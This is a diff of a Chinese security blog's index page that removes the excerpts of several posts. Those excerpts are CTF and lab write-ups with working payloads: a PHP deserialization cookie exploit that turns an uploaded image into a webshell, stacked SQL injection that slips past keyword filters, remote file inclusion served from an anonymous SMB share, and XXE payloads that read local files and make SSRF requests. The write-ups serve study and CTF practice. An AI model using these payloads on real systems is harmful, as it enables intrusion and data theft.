-<p>编写EXP生成cookie:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Register</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $checker;</span><br><span class="line">    <span class="keyword">public</span> $registed = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($checker)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checker= $checker;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span></span><br><span class="line"><span class="class"></span>&#123;   <span class="comment"># 先上传一个图片马shell.png，保存路径为/upload/md5($_SERVER['REMOTE_ADDR'])/md5($_FILES['upload_file']['name']).".png"</span></span><br><span class="line">    <span class="keyword">public</span> $filename_tmp = <span class="string">'../upload/3b1412753f475cc969c37231dd6eaea2/a5d5e995f1a8882cb459eba2102805cd.png'</span>;</span><br><span class="line">    <span class="keyword">public</span> $filename = <span class="string">'../upload/3b1412753f475cc969c37231dd6eaea2/info.php'</span>;</span><br><span class="line">    <span class="keyword">public</span> $ext = <span class="keyword">true</span>;</span><br><span class="line">    <span class="keyword">public</span> $except = <span class="keyword">array</span>(<span class="string">'index'</span> =&gt; <span class="string">'upload_img'</span>);</span><br><span class="line">&#125;</span><br><span class="line">$register = <span class="keyword">new</span> Register(<span class="keyword">new</span> Profile());</span><br><span class="line"><span class="keyword">echo</span> urlencode(base64_encode(serialize($register)));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>上传这段cookie,然后刷新一下，跳出错误，继续上传这段cookie,然后再刷新，然后访问info.php<br><img src="/2019/06/07/2019年强网杯部分web复现/2.png" alt=""></p>
-<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>（1）反序列化的知识还需加强<br>（2）在审计代码时，要注意哪些属性是可控的，在编写exp时候，需要注意哪些属性我们需要加入，比如<strong>public $registed = false;</strong>以及<strong>public $ext = true;</strong></p>
-<h1 id="随便注"><a href="#随便注" class="headerlink" title="随便注"></a>随便注</h1><p>万能密码先试一下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">'or '</span><span class="number">1</span><span class="string">'= '</span><span class="number">1</span></span><br></pre></td></tr></table></figure></p>
-<p>尝试注入，<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">' union select database()#</span></span><br></pre></td></tr></table></figure></p>
-<p>回显：<code>return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</code></p>
-<p>堆叠注入为注入方式：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;;show tables;#</span><br></pre></td></tr></table></figure></p>
-<p>回显：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="number">2</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  string(<span class="number">1</span>) <span class="string">"1"</span></span><br><span class="line">  [<span class="number">1</span>]=&gt;</span><br><span class="line">  string(<span class="number">7</span>) <span class="string">"hahahah"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  string(<span class="number">16</span>) <span class="string">"1919810931114514"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  string(<span class="number">5</span>) <span class="string">"words"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>考虑到过滤掉很多关键字，所以这里考虑使用<strong>sql预编译功能</strong></p>
-<p>MySQL官方将prepare、execute、deallocate统称为PREPARE STATEMENT<br>示例代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PREPARE stmt_name FROM preparable_stmt</span><br><span class="line"> </span><br><span class="line">EXECUTE stmt_name</span><br><span class="line"> [USING @var_name [, @var_name] ...] -</span><br><span class="line"> </span><br><span class="line">&#123;DEALLOCATE | DROP&#125; PREPARE stmt_name</span><br></pre></td></tr></table></figure></p>
-<p>举个例子：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; PREPARE pr1 FROM <span class="string">'SELECT ?+?'</span>;</span><br><span class="line">Query OK, <span class="number">0</span> rows affected (<span class="number">0.01</span> sec)</span><br><span class="line">Statement prepared</span><br><span class="line"> </span><br><span class="line">mysql&gt; SET @a=<span class="number">1</span>, @b=<span class="number">10</span> ;</span><br><span class="line">Query OK, <span class="number">0</span> rows affected (<span class="number">0.00</span> sec)</span><br><span class="line"> </span><br><span class="line">mysql&gt; EXECUTE pr1 USING @a, @b;</span><br><span class="line">+------+</span><br><span class="line">| ?+? |</span><br><span class="line">+------+</span><br><span class="line">| <span class="number">11</span> |</span><br><span class="line">+------+</span><br><span class="line"><span class="number">1</span> row in set (<span class="number">0.00</span> sec)</span><br><span class="line"> </span><br><span class="line">mysql&gt; DEALLOCATE PREPARE pr1;</span><br><span class="line">Query OK, <span class="number">0</span> rows affected (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure></p>
-<p>每一次执行完EXECUTE时，养成好习惯，须执行DEALLOCATE PREPARE … 语句，这样可以释放执行中使用的所有数据库资源（如游标）</p>
-<p>所以这里我们的payload可以这样考虑<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">';</span></span><br><span class="line"><span class="string">sEt @sql = concat('</span>sel<span class="string">','</span>ect database()<span class="string">');</span></span><br><span class="line"><span class="string">prepare pr from @sql;</span></span><br><span class="line"><span class="string">execute pr;</span></span><br><span class="line"><span class="string">deallocate prEpaRe pr;</span></span><br><span class="line"><span class="string">#</span></span><br></pre></td></tr></table></figure></p>
-<p>回显：<code>strstr($inject, &quot;set&quot;) &amp;&amp; strstr($inject, &quot;prepare&quot;)</code></p>
-<p>使用大小写绕过,成功<br>然后获取flag的payload为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1&apos;;</span><br><span class="line">sEt @sql = concat(&quot;sel&quot;,&quot;ect * from `1919810931114514`&quot;);</span><br><span class="line">prepare pr from @sql;</span><br><span class="line">execute pr;</span><br><span class="line">deallocate prEpaRe pr;</span><br><span class="line">#</span><br></pre></td></tr></table></figure></p>
-<p>这里有一个需要注意的小问题就是，在<strong>“select * from 数据表名”</strong>，数据表名要用反引号。</p>
-
+            <p>
+              
+              ...
+            </p>
+          <!--noindex-->
           
+            <div class="post-button text-center">
+              <a class="btn" href="/2019/06/07/2019年强网杯部分web复现/#more" rel="contents">
+                Weiterlesen &raquo;
+              </a>
+            </div>
+          
+          <!--/noindex-->
         
       
     </div>
@@ -1516,7 +1624,7 @@
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="cookie">
       <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="image" content="/images/name.png">
     </span>
 
     <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
@@ -1612,21 +1720,19 @@
       
         
           
-            <p>远程文件包含漏洞在allow_url_fopen以及allow_url_include为off的情况下，我们该怎么办</p>
-<h1 id="0x01-测试过程"><a href="#0x01-测试过程" class="headerlink" title="0x01 测试过程"></a>0x01 测试过程</h1><p>测试代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">  $temp = $_GET[<span class="string">'file'</span>];</span><br><span class="line">  <span class="keyword">include</span>($temp);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>这里样的代码在无任何防护的情况下，满足<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen=On</span><br><span class="line">allow_url_include=On</span><br></pre></td></tr></table></figure></p>
-<p>可执行远程文件包含漏洞<br>我们在IP为192.168.43.60的主机上编写web shell，正常情况下，如下图<br><img src="/2019/06/07/RFI与SMB/1.png" alt=""></p>
-<p>当我们off掉，程序报错，情况如下：<br><img src="/2019/06/07/RFI与SMB/2.png" alt=""></p>
-<h1 id="解决策略"><a href="#解决策略" class="headerlink" title="解决策略"></a>解决策略</h1><p>使用匿名读取访问权限配置SAMBA服务器（Linux计算机）<br>使用下面提到的命令安装SAMBA服务器：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install samba</span><br></pre></td></tr></table></figure></p>
-<p>创建SMB共享目录（在我的情况下为/ var / www / html / pub /）<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir /<span class="keyword">var</span>/www/html/pub/</span><br></pre></td></tr></table></figure></p>
-<p>配置新创建的SMB共享目录的权限：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod <span class="number">0555</span> /<span class="keyword">var</span>/www/html/pub/</span><br><span class="line">chown -R nobody:nogroup /<span class="keyword">var</span>/www/html/pub/</span><br></pre></td></tr></table></figure></p>
-<p>运行以下提到的命令以删除SAMBA服务器配置文件的默认内容<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> &gt; /etc/samba/smb.conf</span><br></pre></td></tr></table></figure></p>
-<p>将下面提到的内容放在’/etc/samba/smb.conf’文件中<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">[<span class="keyword">global</span>]</span><br><span class="line">workgroup = WORKGROUP</span><br><span class="line">server string = Samba Server %v</span><br><span class="line">netbios name = indishell-lab</span><br><span class="line">security = user</span><br><span class="line">map to guest = bad user</span><br><span class="line">name resolve order = bcast host</span><br><span class="line">dns proxy = no</span><br><span class="line">bind interfaces only = yes</span><br><span class="line"></span><br><span class="line">[ica]</span><br><span class="line">path = /<span class="keyword">var</span>/www/html/pub</span><br><span class="line">writable = no</span><br><span class="line">guest ok = yes</span><br><span class="line">guest only = yes</span><br><span class="line">read only = yes</span><br><span class="line">directory mode = <span class="number">0555</span></span><br><span class="line">force user = nobody</span><br></pre></td></tr></table></figure></p>
-<p>重新启动SAMBA服务器以应用配置文件/etc/samba/smb.conf中的spcified新配置<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\\<span class="number">192.168</span><span class="number">.0</span><span class="number">.3</span>\</span><br></pre></td></tr></table></figure></p>
-<p><img src="/2019/06/07/RFI与SMB/3.png" alt=""><br>因为smb服务可用于文件共享，通过这个思路绕过RFI限制。<br>在pub文件夹下编写web shell<br><img src="/2019/06/07/RFI与SMB/4.png" alt=""></p>
-<p>测试一下：<br><img src="/2019/06/07/RFI与SMB/5.png" alt=""><br>成功</p>
-
+            <p>
+              
+              ...
+            </p>
+          <!--noindex-->
           
+            <div class="post-button text-center">
+              <a class="btn" href="/2019/06/07/RFI与SMB/#more" rel="contents">
+                Weiterlesen &raquo;
+              </a>
+            </div>
+          
+          <!--/noindex-->
         
       
     </div>
@@ -1688,7 +1794,7 @@
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="cookie">
       <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="image" content="/images/name.png">
     </span>
 
     <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
@@ -1784,230 +1890,19 @@
       
         
           
-            <p>xml实体注入攻击小记</p>
-<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p>参考文章：<br><a href="https://blog.csdn.net/shinpachi8/article/details/53456437" target="_blank" rel="noopener">XXE漏洞及Blind XXE练习</a><br><a href="https://chybeta.github.io/2017/07/04/%E5%B0%8F%E8%AF%95XML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/" target="_blank" rel="noopener">小试XML实体注入攻击</a></p>
-<h2 id="XML基本知识"><a href="#XML基本知识" class="headerlink" title="XML基本知识"></a>XML基本知识</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;chybeta&lt;/to&gt;</span><br><span class="line">&lt;from&gt;ph0en1x&lt;/from&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure>
-<p>代码的第一行，定义了XML的版本与编码</p>
-<p>在XML文档中，所有的元素都必须正确的嵌套，形成树形结构。并且整个XML文档中必须要有一个根元素。如上代码，<note>是整个文档的根元素。嵌套在note标签中的<to>和<from>则是根的子元素。</from></to></note></p>
-<p>同时，所有的XML元素都必须有关闭标签，这点不像html语法那样松散。如果缺失关闭标签，则会导致XML解析失败。</p>
-<h2 id="实体"><a href="#实体" class="headerlink" title="实体"></a>实体</h2><p>所有的XML文档都由五种简单的构建模块（元素，属性，实体，PCDATA CDATA）构成。这里着重介绍一下实体：<strong>实体是用于定义引用普通文本或特殊字符的快捷方式的变量，实体引用是对实体的引用。</strong>实体可在内部或外部进行声明。因此我们利用引入实体，构造恶意内容，从而达到攻击的目的。</p>
-<p><strong>XML实体分为四种：字符实体，命名实体，外部实体，参数实体。</strong></p>
-<h2 id="文档类型定义：DTD"><a href="#文档类型定义：DTD" class="headerlink" title="文档类型定义：DTD"></a>文档类型定义：DTD</h2><p>wikipedia关于这的描述是:The XML DTD syntax is one of several XML schema languages。简单的说，DTD的作用是定义XML文档的合法构建模块。如前所述，实体也是构建模块之一。因此可以<strong>利用DTD来内部或外部引入实体</strong>。</p>
-<p>其基本格式：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素名 [  元素描述   ]&gt;</span><br></pre></td></tr></table></figure></p>
-<h3 id="内部引用"><a href="#内部引用" class="headerlink" title="内部引用"></a>内部引用</h3><p>格式：<strong>&lt;!ENTITY 实体名称 “实体的值”&gt;</strong></p>
-<p>将DTD和XML放在同一份文档中，利用DTD定义的实体即为内部实体。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span><span class="meta">?&gt;</span>  </span><br><span class="line">&lt;!DOCTYPE xxe [  </span><br><span class="line">    &lt;!ENTITY  chybeta  <span class="string">"Hello World!"</span>&gt;    </span><br><span class="line">]&gt;  </span><br><span class="line">&lt;xxe&gt;  </span><br><span class="line">    &amp;chybeta;</span><br><span class="line">&lt;/xxe&gt;</span><br></pre></td></tr></table></figure></p>
-<p>访问该XML文档，&chybeta;会被解析为Hello World!并输出。</p>
-<h3 id="外部引入"><a href="#外部引入" class="headerlink" title="外部引入"></a>外部引入</h3><p>基本格式：<strong>&lt;!ENTITY 实体名称 SYSTEM “URI”&gt;</strong><br>通过引用定义在外部的DTD中的实体，我们称之为外部实体。</p>
-<h1 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h1><h2 id="xxe注入"><a href="#xxe注入" class="headerlink" title="xxe注入"></a>xxe注入</h2><p>xxe漏洞利用外部实体</p>
-<h3 id="读取本地文件"><a href="#读取本地文件" class="headerlink" title="读取本地文件"></a>读取本地文件</h3><p>搭建环境file.php：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  $xml=simplexml_load_string($_GET[<span class="string">'xml'</span>]);</span><br><span class="line">  print_r((string)$xml);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>这是一段没有任何防护的代码，这里就存在xxe漏洞<br>我们构造payload，访问服务器里的flag.txt文件（内容为“you are right”）<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE root [&lt;!ENTITY  file SYSTEM <span class="string">"file:///D://phpstudy/PHPTutorial/WWW/flag.txt"</span>&gt;]&gt;</span><br><span class="line">&lt;root&gt;&amp;file;&lt;/root&gt;</span><br></pre></td></tr></table></figure></p>
-<p>将这段代码进行<strong>url编码</strong>，传入后，获得flag.txt文件的内容<br><img src="/2019/06/07/xml实体攻击小记/xml实体攻击小记/1.png" alt=""></p>
-<p>这里有一道ctf的题作为练习参考用,题目地址：<a href="http://web.jarvisoj.com:9882/" target="_blank" rel="noopener">http://web.jarvisoj.com:9882/</a><br><strong>修改Content-type： application/xml</strong></p>
-<p><img src="/2019/06/07/xml实体攻击小记/xml实体攻击小记/2.png" alt=""><br><img src="/2019/06/07/xml实体攻击小记/xml实体攻击小记/3.png" alt=""></p>
-<p>注意：<strong>如果要读取php文件，因为php、html等文件中有各种括号&lt;，&gt;，若直接用file读取会导致解析错误，此时可以利用php://filter将内容转换为base64后再读取。</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE root [&lt;!ENTITY  file SYSTEM <span class="string">"php://filter/convert.base64-encode/resource=D://phpstudy/PHPTutorial/WWW/hack.php"</span>&gt;]&gt;</span><br><span class="line">&lt;root&gt;&amp;file;&lt;/root&gt;</span><br></pre></td></tr></table></figure></p>
-<p>同样进行url编码<br><img src="/2019/06/07/xml实体攻击小记/xml实体攻击小记/4.png" alt=""><br><img src="/2019/06/07/xml实体攻击小记/xml实体攻击小记/5.png" alt=""></p>
-<h3 id="内网探测-SSRF"><a href="#内网探测-SSRF" class="headerlink" title="内网探测/SSRF"></a>内网探测/SSRF</h3><p>SSRF实际上就是一种攻击者的攻击思路，简单的说就是服务器用对外提供服务的外网服务器，有对内部工作人员使用的内部服务器，攻击着通过向外网服务器发起请求，服务器接收请求后，未对请求进行验证过滤，此请求可以达到让外网服务器，访问内网的资源，导致攻击者通过外网的请求获取的服务端后台的一些信息。<br>bwapp中的XXE练习，我们使用burpsuit抓包<br>同样修改Content-type,附上内容<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line"> &lt;!ENTITY bWAPP SYSTEM <span class="string">"http://localhost/bWAPP/robots.txt"</span>&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;reset&gt;&lt;login&gt;&amp;bWAPP;&lt;/login&gt;&lt;secret&gt;blah&lt;/secret&gt;&lt;/reset&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Accesses a file on the internal network (2)</span></span><br><span class="line"><span class="comment"># Web pages returns some characters that break the XML schema &gt; use the PHP base64 encoder filter to return an XML schema friendly version of the page!</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line"> &lt;!ENTITY bWAPP SYSTEM <span class="string">"php://filter/read=convert.base64-encode/resource=http://localhost/bWAPP/passwords/heroes.xml"</span>&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;reset&gt;&lt;login&gt;&amp;bWAPP;&lt;/login&gt;&lt;secret&gt;blah&lt;/secret&gt;&lt;/reset&gt;</span><br></pre></td></tr></table></figure></p>
-<p>获取数据后再进行base64解码</p>
-<p>关于SSRF的习题有很多，而这里我们也只是管中窥豹。</p>
-
-          
-        
-      
-    </div>
-
-    
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/25/linux-curl/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="cookie">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="The clown is laughing at you">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2019/04/25/linux-curl/" class="post-title-link" itemprop="url">linux-curl</a>
+            <p>
               
-            
-          </h1>
-        
-
-        <div class="post-meta">
-
+              ...
+            </p>
+          <!--noindex-->
           
+            <div class="post-button text-center">
+              <a class="btn" href="/2019/06/07/xml实体攻击小记/#more" rel="contents">
+                Weiterlesen &raquo;
+              </a>
+            </div>
           
-          
-
-          
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Veröffentlicht am</span>
-              
-
-              
-                
-              
-
-              <time title="Erstellt: 2019-04-25 19:42:32 / Geändert am: 19:43:13" itemprop="dateCreated datePublished" datetime="2019-04-25T19:42:32+08:00">2019-04-25</time>
-            </span>
-          
-
-          
-            
-
-            
-          
-
-          
-
-          
-            
-            
-          
-
-          
-          
-
-          
-
-          
-
-          <br>
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>curl：<br>在Linux中curl是一个利用URL规则在命令行下工作的文件传输工具，可以说是一款很强大的http命令行工具。它支持文件的上传和下载，是综合传输工具，但按传统，习惯称url为下载工具。</p>
-<h1 id="介绍curl的常见参数"><a href="#介绍curl的常见参数" class="headerlink" title="介绍curl的常见参数"></a>介绍curl的常见参数</h1><p>其语法格式：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl [option] [url]</span><br></pre></td></tr></table></figure></p>
-<p>常见参数：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">-A/--user-agent &lt;string&gt;              设置用户代理发送给服务器</span><br><span class="line">-b/--cookie &lt;name=string/file&gt;    cookie字符串或文件读取位置</span><br><span class="line">-c/--cookie-jar &lt;file&gt;                    操作结束后把cookie写入到这个文件中</span><br><span class="line">-C/--<span class="keyword">continue</span>-at &lt;offset&gt;            断点续转</span><br><span class="line">-D/--dump-header &lt;file&gt;              把header信息写入到该文件中</span><br><span class="line">-e/--referer                                  来源网址</span><br><span class="line">-f/--fail                                          连接失败时不显示http错误</span><br><span class="line">-o/--output                                  把输出写到该文件中</span><br><span class="line">-O/--remote-name                      把输出写到该文件中，保留远程文件的文件名</span><br><span class="line">-r/--range &lt;range&gt;                      检索来自HTTP/<span class="number">1.1</span>或FTP服务器字节范围</span><br><span class="line">-s/--silent                                    静音模式。不输出任何东西</span><br><span class="line">-T/--upload-file &lt;file&gt;                  上传文件</span><br><span class="line">-u/--user &lt;user[:password]&gt;      设置服务器的用户和密码</span><br><span class="line">-w/--write-out [format]                什么输出完成后</span><br><span class="line">-x/--proxy &lt;host[:port]&gt;              在给定的端口上使用HTTP代理</span><br><span class="line">-<span class="comment">#/--progress-bar                        进度条显示当前的传送状态</span></span><br></pre></td></tr></table></figure></p>
-<h1 id="curl常见用法"><a href="#curl常见用法" class="headerlink" title="curl常见用法"></a>curl常见用法</h1><h2 id="0x01-基本使用"><a href="#0x01-基本使用" class="headerlink" title="0x01 基本使用"></a>0x01 基本使用</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl http://www.baidu.com</span><br></pre></td></tr></table></figure>
-<p>执行后，<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a> 的html就会显示在屏幕上了</p>
-<p>Ps：由于安装linux的时候很多时候是没有安装桌面的，也意味着没有浏览器，因此这个方法也经常用于测试一台服务器是否可以到达一个网站</p>
